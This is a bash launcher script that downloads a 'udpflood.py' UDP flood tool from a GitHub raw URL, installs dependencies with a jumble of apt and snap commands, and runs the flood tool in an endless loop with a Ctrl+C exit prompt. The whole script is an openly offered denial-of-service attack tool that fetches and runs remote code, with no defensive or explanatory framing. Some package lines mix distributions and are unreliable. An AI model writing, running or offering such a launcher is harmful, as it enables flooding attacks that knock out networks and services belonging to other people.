#!/bin/bash
clear
wget -O /tmp/udpflood.py 'https://raw.githubusercontent.com/trusinadev/udp-flood/master/udpflood.py'
chmod +x /tmp/udpflood.py
sudo apt install epel-release -y
sudo apt install snapd -y
sudo apt install python38 -y
sudo apt install python -y
sudo apt-get install python38 -y
sudo systemctl enable --now snapd.socket
sudo ln -s /var/lib/snapd/snap /snap
sudo apt -y update
sudo apt -y upgrade
sudo snap install figlet
sudo apt -y install figlet
cd /tmp
clear
while true; do
    clear
    python3 udpflood.py
    case $? in
    130) break ;;
    esac
    clear
    figlet Hit another time Ctrl + C to exit -f slant
    figlet You have 10 seconds -f smslant
    sleep 10
    clear
done
clear
